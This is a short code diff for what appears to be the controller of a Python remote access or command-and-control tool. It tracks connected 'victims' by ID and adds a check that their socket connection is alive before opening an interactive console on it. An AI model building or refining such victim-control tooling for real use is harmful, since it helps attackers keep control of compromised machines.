@@ -5,7 +5,6 @@ import time
 import os
 import utils
 
-
 class InteractVictim():
 
     def __init__(self, victim_id:int, victim_connection:socket.socket):
@@ -220,8 +219,15 @@ class Server():
                         print(f"[!] Victim with ID {id} does not exists.\n")
                         continue
                     
-                    victim_console = InteractVictim(id, self.victims_dict.get(id))
-                    victim_console.victim_console()
+                    if utils._is_alive(self.victims_dict.get(id)):
+                        victim_console = InteractVictim(id, self.victims_dict.get(id))
+                        victim_console.victim_console()
+                        
+                    else:
+                        print("[!] Connection with victim is broken.")
+                        self._close_connection(id)
+                    
+
     
                 else:
                     print("[-] Please enter a valid command\n")
